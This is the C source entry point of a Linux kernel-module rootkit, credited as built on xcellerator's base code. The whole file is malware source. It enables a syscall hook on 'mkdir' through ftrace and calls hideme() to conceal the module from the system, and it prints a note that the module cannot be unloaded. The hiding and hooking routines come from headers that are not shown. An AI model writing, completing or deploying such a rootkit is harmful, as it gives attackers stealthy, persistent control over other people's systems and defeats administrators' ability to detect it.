/*
 * credits goes to xcellerator, which provided the base code for this rootkit
 */

#define HIDE_MODULE
#define SYSCALL_HOOK
#define SYSCALL_HOOK_TO "mkdir"

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#ifdef SYSCALL_HOOK

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64)
#define PTREGS_SYSCALL_STUBS 1
#endif

#include "ftrace_helper.h"

#endif


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Began Bajrami");
MODULE_DESCRIPTION("IRM-C");
MODULE_VERSION("0.01");

#ifdef HIDE_MODULE
#include "features/hide.h"
#endif

static int __init rootkit_init(void) {
  printk(KERN_INFO "hey! i'm just a chill module.\n");

#ifdef HIDE_MODULE
  printk(KERN_INFO "let me hide myself...\n");
  hideme();
#endif

  return 0;
}

static void __exit rootkit_exit(void) {
  /* Note that you won't be able to unload this LKM yet... */
  printk(KERN_INFO "How did you find me?\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
